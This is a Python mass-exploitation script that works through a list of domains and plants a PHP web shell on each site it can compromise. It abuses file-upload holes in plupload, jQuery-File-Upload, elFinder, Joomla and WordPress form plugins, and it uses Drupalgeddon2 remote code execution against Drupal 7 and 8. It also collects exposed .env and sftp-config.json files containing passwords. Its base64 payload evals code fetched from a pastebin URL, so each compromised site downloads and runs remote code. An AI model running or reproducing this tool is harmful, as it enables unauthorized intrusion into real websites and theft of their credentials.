#!/usr/bin/env python3

from datetime import datetime
from time import sleep, strftime
import requests, sys, urllib, urllib3, threading
import os, base64, re, json, subprocess

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
file = open('domain.txt', 'r').read().split('\n')
user_agent = {'User-agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}
os.system('export LD_PRELOAD=/lib/x86_64-linux-gnu/libgcc_s.so.1')
x = subprocess.getoutput('ulimit -n')
if int(x) <= 16384: y = subprocess.getoutput('ulimit -n 16384')
else: pass

class cl:
	green = '\033[92m'
	end = '\033[0m'

def sizeof(num, suffix='B'):
	for unit in [' ','K','M','G','T','P','E','Z']:
		if abs(num) < 1024.0:
			return('{:>4} {}{}'.format(format(num, '.3g'), unit, suffix))
		num /= 1024.0

def plupload(line):
	try:
		url = '{}plupload/examples/upload.php'.format(line)
		hsl = '{}plupload/examples/uploads/more.php'.format(line)
		r = requests.post(url, files={'file': open('more.php', 'rb')}, headers = user_agent, timeout = 5, verify=False)
		ox = requests.get(hsl, headers = user_agent, timeout = 5, verify=False)
		oxs = ox.status_code
		oxt = ox.text
		num = int(len(ox.text))
		if oxs == 200 and 'webadmin.php' in oxt:
			sys.stdout.write(cl.green + '| {} | {} - {} | {}\n'.format(datetime.now().strftime('%H:%M:%S'), oxs, sizeof(num), hsl) + cl.end)
			open('hasil.txt', 'a').write('{}\n'.format(hsl))

	except: pass

def jquery(line, exp, shl):
	try:
		url = '{}{}'.format(line, exp)
		hsl = '{}{}'.format(line, shl)
		r = requests.post(url, files={'files[]': open('more.php', 'rb')}, headers = user_agent, timeout = 5, verify=False)
		ox = requests.get(hsl, headers = user_agent, timeout = 5, verify=False)
		oxs = ox.status_code
		oxt = ox.text
		num = int(len(ox.text))
		if oxs == 200 and 'webadmin.php' in oxt:
			sys.stdout.write(cl.green + '| {} | {} - {} | {}\n'.format(datetime.now().strftime('%H:%M:%S'), oxs, sizeof(num), hsl) + cl.end)
			open('hasil.txt', 'a').write('{}\n'.format(hsl))

	except: pass

def jqupload(line):
	jquery(line, 'assets/js/plugins/jquery-file-upload/server/php/', 'assets/js/plugins/jquery-file-upload/server/php/files/more.php')
	jquery(line, 'assets/global/plugins/jquery-file-upload/server/php/', 'assets/global/plugins/jquery-file-upload/server/php/files/more.php')
	jquery(line, 'js/plugins/jquery-file-upload/server/php/', 'js/plugins/jquery-file-upload/server/php/files/more.php')
	jquery(line, 'js/jquery-file-upload/server/php/', 'js/jquery-file-upload/server/php/files/more.php')
	jquery(line, 'assets/js/plugins/jQuery-File-Upload/server/php/', 'assets/js/plugins/jQuery-File-Upload/server/php/files/more.php')
	jquery(line, 'assets/global/plugins/jQuery-File-upload/server/php/', 'assets/global/plugins/jQuery-File-Upload/server/php/files/more.php')
	jquery(line, 'js/plugins/jQuery-File-Upload/server/php/', 'js/plugins/jQuery-File-Upload/server/php/files/more.php')
	jquery(line, 'js/jQuery-File-Upload/server/php/', 'js/jQuery-File-Upload/server/php/files/more.php')
	jquery(line, 'server/php/', 'server/php/files/more.php')
	jquery(line, 'components/com_sexycontactform/fileupload/index.php', 'components/com_sexycontactform/fileupload/files/more.php')
	jquery(line, 'joomla/components/com_sexycontactform/fileupload/index.php', 'joomla/components/com_sexycontactform/fileupload/files/more.php')
	jquery(line, 'components/com_creativecontactform/fileupload/index.php', 'components/com_creativecontactform/fileupload/files/more.php')
	jquery(line, 'joomla/components/com_creativecontactform/fileupload/index.php', 'joomla/components/com_creativecontactform/fileupload/files/more.php')
	jquery(line, 'wp-content/plugins/sexy-contact-form/includes/fileupload/index.php', 'wp-content/plugins/sexy-contact-form/includes/fileupload/files/more.php')
	jquery(line, 'wp/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php', 'wp/wp-content/plugins/sexy-contact-form/includes/fileupload/files/more.php')
	jquery(line, 'wordpress/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php', 'wordpress/wp-content/plugins/sexy-contact-form/includes/fileupload/files/more.php')
	jquery(line, 'blog/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php', 'blog/wp-content/plugins/sexy-contact-form/includes/fileupload/files/more.php')

def laraenv(line):
	try:
		url = '{}.env'.format(line)
		r = requests.get(url, headers = user_agent, timeout = 5, verify=False)
		rs = r.status_code
		num = int(len(r.text))
		psw = r.text
		if rs == 200 and 'PASSWORD' in psw:
			sys.stdout.write(cl.green + '| {} | {} - {} | {}\n'.format(datetime.now().strftime('%H:%M:%S'), rs, sizeof(num), url) + cl.end)
			open('hasil.txt', 'a').write('{}\n'.format(url))

	except: pass

def sftpconf(line):
	try:
		url = '{}sftp-config.json'.format(line)
		r = requests.get(url, headers = user_agent, timeout = 5, verify=False)
		rs = r.status_code
		num = int(len(r.text))
		psw = r.text
		if rs == 200 and 'password' in psw:
			sys.stdout.write(cl.green + '| {} | {} - {} | {}\n'.format(datetime.now().strftime('%H:%M:%S'), rs, sizeof(num), url) + cl.end)
			open('hasil.txt', 'a').write('{}\n'.format(url))

	except: pass

def wpregister(line):
	try:
		url = '{}wp-login.php?action=register'.format(line)
		r = requests.get(url, headers = user_agent, timeout = 5, verify=False)
		rs = r.status_code
		num = int(len(r.text))
		if 'message register' in r.text:
			sys.stdout.write(cl.green + '| {} | {} - {} | {}\n'.format(datetime.now().strftime('%H:%M:%S'), rs, sizeof(num), url) + cl.end)
			open('hasil.txt', 'a').write('{}\n'.format(url))

	except: pass

def elfinder(line, exp):
	try:
		urlx = line + exp + '/php/connector.php'
		mkfile = requests.get('{}{}/php/connector.php?cmd=mkfile&name=more.php&target=l1_Lw'.format(line, exp), headers = user_agent, timeout = 5, verify=False)
		trgt = 'l1_' + base64.b64encode(b'more.php').decode('utf-8')
		upl = base64.b64decode(b'PD9waHAgZXZhbCgiPz4iLmZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvQ3VyUXJIMWEiKSk7ID8+').decode('utf-8')
		post = {'cmd': 'put', 'target': trgt, 'content': upl}
		exp1 = requests.post(urlx, data=post, headers = user_agent, timeout = 5, verify=False)
		exp2 = requests.post(urlx + '?cmd=upload', data={'current': 'ebb01746fc058386b639c18ea6a2b1f1'}, files={'upload[]': open('more.php', 'rb')}, headers = user_agent, timeout = 5, verify=False) # ../files
		exp3 = requests.post(urlx + '?cmd=upload', data={'current': '8ea8853cb93f2f9781e0bf6e857015ea'}, files={'upload[]': open('more.php', 'rb')}, headers = user_agent, timeout = 5, verify=False) # ../../files
		psh = line + exp + '/files/more.php'
		cek = requests.get(psh, headers = user_agent, timeout = 5, verify=False)
		ceks = cek.status_code
		num = int(len(cek.text))
		if ceks == 200 and 'webadmin.php' in cek.text:
			sys.stdout.write(cl.green + '| {} | {} - {} | {}\n'.format(datetime.now().strftime('%H:%M:%S'), ceks, sizeof(num), psh) + cl.end)
			open('hasil.txt', 'a').write('{}\n'.format(psh))

		psh2 = line + 'files/more.php'
		cek2 = requests.get(psh2, headers = user_agent, timeout = 5, verify=False)
		ceks2 = cek2.status_code
		num2 = int(len(cek2.text))
		if ceks2 == 200 and 'webadmin.php' in cek2.text:
			sys.stdout.write(cl.green + '| {} | {} - {} | {}\n'.format(datetime.now().strftime('%H:%M:%S'), ceks2, sizeof(num2), psh2) + cl.end)
			open('hasil.txt', 'a').write('{}\n'.format(psh2))

	except: pass

def exfinder(line):
	elfinder(line, 'elFinder')
	elfinder(line, 'elfinder')

def drupal7(target):
	try:
		verify = True
		cmd = 'echo PD9waHAgZXZhbCgiPz4iLmZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvQ3VyUXJIMWEiKSk7ID8+ | base64 -d | tee ./x7.php ./sites/default/x7.php ./sites/default/files/x7.php'
		url = target + '?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=' + cmd
		data = { 'form_id': 'user_pass', '_triggering_element_name': 'name' }
		req = requests.post(url, data=data, headers=user_agent, verify=verify, timeout=5)
		patern = re.compile('<input type="hidden" name="form_build_id" value="(.+?)" />')
		form = re.findall(patern, req.text)
		url2 = target + '?q=file/ajax/name/%23value/' + form[0]
		post = { 'form_build_id': form[0] }
		send = requests.post(url2, data=post, headers=user_agent, timeout=5)
		get1 = requests.get(target + 'x7.php', headers=user_agent, timeout=5)
		get2 = requests.get(target + 'sites/default/x7.php', headers=user_agent, timeout=5)
		get3 = requests.get(target + 'sites/default/files/x7.php', headers=user_agent, timeout=5)
		if get1.status_code == 200 and 'webadmin.php' in get1.text:
			sys.stdout.write(cl.green + '| {} | {} - {} | {}\n'.format(datetime.now().strftime('%H:%M:%S'), get1.status_code, sizeof(int(len(get1.text))), target + 'x7.php') + cl.end)
			open('hasil.txt', 'a').write('{}x7.php\n'.format(target))

		if get2.status_code == 200 and 'webadmin.php' in get2.text:
			sys.stdout.write(cl.green + '| {} | {} - {} | {}\n'.format(datetime.now().strftime('%H:%M:%S'), get2.status_code, sizeof(int(len(get2.text))), target + 'sites/default/x7.php') + cl.end)
			open('hasil.txt', 'a').write('{}sites/default/x7.php\n'.format(target))

		if get3.status_code == 200 and 'webadmin.php' in get3.text:
			sys.stdout.write(cl.green + '| {} | {} - {} | {}\n'.format(datetime.now().strftime('%H:%M:%S'), get3.status_code, sizeof(int(len(get3.text))), target + 'sites/default/files/x7.php') + cl.end)
			open('hasil.txt', 'a').write('{}sites/default/files/x7.php\n'.format(target))

	except: pass

def drupal8(target):
	try:
		verify = True
		cmd = 'echo PD9waHAgZXZhbCgiPz4iLmZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvQ3VyUXJIMWEiKSk7ID8+ | base64 -d | tee ./x8.php ./sites/default/x8.php ./sites/default/files/x8.php'
		url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
		payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': cmd }
		req = requests.post(url, data=payload, headers=user_agent, verify=verify, timeout=5)
		get1 = requests.get(target + 'x8.php', headers=user_agent, timeout=5)
		get2 = requests.get(target + 'sites/default/x8.php', headers=user_agent, timeout=5)
		get3 = requests.get(target + 'sites/default/files/x8.php', headers=user_agent, timeout=5)
		if get1.status_code == 200 and 'webadmin.php' in get1.text:
			sys.stdout.write(cl.green + '| {} | {} - {} | {}\n'.format(datetime.now().strftime('%H:%M:%S'), get1.status_code, sizeof(int(len(get1.text))), target + 'x8.php') + cl.end)
			open('hasil.txt', 'a').write('{}x8.php\n'.format(target))

		if get2.status_code == 200 and 'webadmin.php' in get2.text:
			sys.stdout.write(cl.green + '| {} | {} - {} | {}\n'.format(datetime.now().strftime('%H:%M:%S'), get2.status_code, sizeof(int(len(get2.text))), target + 'sites/default/x8.php') + cl.end)
			open('hasil.txt', 'a').write('{}sites/default/x8.php\n'.format(target))

		if get3.status_code == 200 and 'webadmin.php' in get3.text:
			sys.stdout.write(cl.green + '| {} | {} - {} | {}\n'.format(datetime.now().strftime('%H:%M:%S'), get3.status_code, sizeof(int(len(get3.text))), target + 'sites/default/files/x8.php') + cl.end)
			open('hasil.txt', 'a').write('{}sites/default/files/x8.php\n'.format(target))

	except: pass

def comfabrik(line):
	try:
		url = line + 'index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload'
		files = {'file': open('more.php', 'rb')}
		r = requests.post(url, files=files, headers=user_agent, verify=False, timeout=5)
		content = r.content
		jso = json.loads(content)
		shel = jso['uri']
		req = requests.get(shel)
		print('')
		if req.status_code == 200 and 'webadmin.php' in req.text:
			sys.stdout.write(cl.green + '| {} | {} - {} | {}\n'.format(datetime.now().strftime('%H:%M:%S'), req.status_code, sizeof(int(len(req.text))), shel) + cl.end)
			open('hasil.txt', 'a').write('{}\n'.format(shel))

	except: pass

def gravityform(line):
	try:
		url = line + '?gf_page=upload'
		she = [ line + 'wp-content/_input_3_more.php5' ]
		she.append(line + 'wp-content/uploads/_input_3_more.php5')
		she.append(line + 'wp-content/uploads/gravity_forms/_input_3_more.php5')
		data = b'<?php eval("?>".file_get_contents("https://pastebin.com/raw/CurQrH1a")); ?>&field_id=3&form_id=1&gform_unique_id=../../../../&name=more.php5'
		r = urllib.request.urlopen(url, data=data)
		for shl in she:
			csh = requests.get(shl)
			if csh.status_code == 200 and 'webadmin.php' in csh.text:
				sys.stdout.write(cl.green + '| {} | {} - {} | {}\n'.format(datetime.now().strftime('%H:%M:%S'), csh.status_code, sizeof(int(len(csh.text))), shl) + cl.end)
				open('hasil.txt', 'a').write('{}\n'.format(shl))

	except: pass

def rikues(line):
	plupload(line)
	laraenv(line)
	laraenv(line + 'laravel/')
	sftpconf(line)
	wpregister(line)
	wpregister(line + 'wp/')
	wpregister(line + 'wordpress/')
	wpregister(line + 'blog/')
	jqupload(line)
	exfinder(line)
	drupal7(line)
	drupal7(line + 'drupal/')
	drupal8(line)
	drupal8(line + 'drupal/')
	comfabrik(line)
	comfabrik(line + 'joomla/')
	gravityform(line)
	gravityform(line + 'wp/')
	gravityform(line + 'wordpress/')
	gravityform(line + 'blog/')

def prog():
	sys.stdout.flush()
	sys.stdout.write('| {} | [+] Wait a moment ...\r'.format(datetime.now().strftime('%H:%M:%S')))
	sys.stdout.flush()
	sys.stdout.write('| {} | [x] Wait a moment ...\r'.format(datetime.now().strftime('%H:%M:%S')))

no = 0
lcount = sum(1 for line in open('domain.txt'))
print('__  ____  __               ____')
print('\ \/ /  \/  | __ _ ___ ___|  _ \ _   _')
print(' \  /| |\/| |/ _` / __/ __| |_) | | | |')
print(' /  \| |  | | (_| \__ \__ \  __/| |_| |')
print('/_/\_\_|  |_|\__,_|___/___/_|    \__, |')
print('                                 |___/ \n')
print('Start scanning..')
print('===============================================================================')
print('| Time     | Info          | URL                                              |')
print('===============================================================================')
for line in file:
	if line == '': break
	try:
		t = threading.Thread(target=rikues, args=(line,))
		t.start()
		no = no + 1
		jumlah = ( no * 100 ) / lcount
		sys.stdout.flush()
		sys.stdout.write("| {} | {}% Line : {}\r".format(datetime.now().strftime('%H:%M:%S'), int(jumlah), int(no)))
		sys.stdout.flush()
	except(KeyboardInterrupt,SystemExit):
		print('\r| {} | Exiting program ...'.format(datetime.now().strftime('%H:%M:%S')))
		print('===============================================================================')
		os.system('kill -9 {}'.format(os.getpid()))

while True:
	try:
		prog()
		cek = threading.active_count()
		if cek == 1: print('==============================================================================='); exit()

	except KeyboardInterrupt:
		print('\r| {} | Exiting program ...'.format(datetime.now().strftime('%H:%M:%S')))
		print('===============================================================================')
		os.system('kill -9 {}'.format(os.getpid()))
